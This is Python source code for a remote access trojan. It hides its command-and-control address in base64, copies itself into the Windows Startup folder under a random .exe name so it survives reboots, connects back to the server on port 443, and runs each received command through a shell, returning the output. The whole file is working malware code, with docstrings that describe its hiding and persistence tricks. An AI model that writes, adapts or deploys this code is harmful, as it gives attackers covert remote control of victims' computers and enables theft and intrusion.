import socket
import subprocess
import threading
import time
import os
import random
import string
import base64

CCIP_ENC = "MTI3LjAuMC4x"  # base64 encoded 127.0.0.1 for test, replace with real encoded IP
CCIP = base64.b64decode(CCIP_ENC).decode()
CCPORT = 443


def random_name(length=8):
    """
   Generates a random filename (e.g., AbCdEfGh.exe)
   Used to hide the RAT binary in the Startup folder.
   """
    return ''.join(random.choices(string.ascii_letters, k=length)) + ".exe"


def autorun():
    """
   Ensures persistence by copying the executable to the Startup folder
   with a random, non-suspicious name so it runs at every reboot.
   """
    filen = os.path.basename(__file__)
    exe_file = filen.replace(".py", ".exe")
    hidden_name = random_name()
    target_path = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup", hidden_name)
    os.system(f"copy {exe_file} \"{target_path}\"")


def conn(CCIP, CCPORT):
    """
    Establish a TCP connection to the CC server.
    Returns the socket if successful, else None.
    """
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((CCIP, CCPORT))
        return client
    except Exception as error:
        print(error)


def cmd(client, data):
    """
   Executes a system command received from the C&C server.
   Sends back stdout and stderr to the server.
   """
    try:
        proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        client.send(output + b"\n")
    except Exception as error:
        print(error)


def cli(client):
    """
    Main command loop.
    Listens for commands from the C&C server and executes them.
    Each command runs in a separate thread.
    """
    try:
        while True:
            data = client.recv(1024).decode().strip()
            # if received kill will stop sending commands but will maintain the connection
            if data == "/:kill":
                return
            else:
                threading.Thread(target=cmd, args=(client, data)).start()
    except Exception as error:
        client.close()


if __name__ == "__main__":
    autorun()
    while True:
        client = conn(CCIP, CCPORT)
        if client:
            cli(client)
        else:
            time.sleep(3)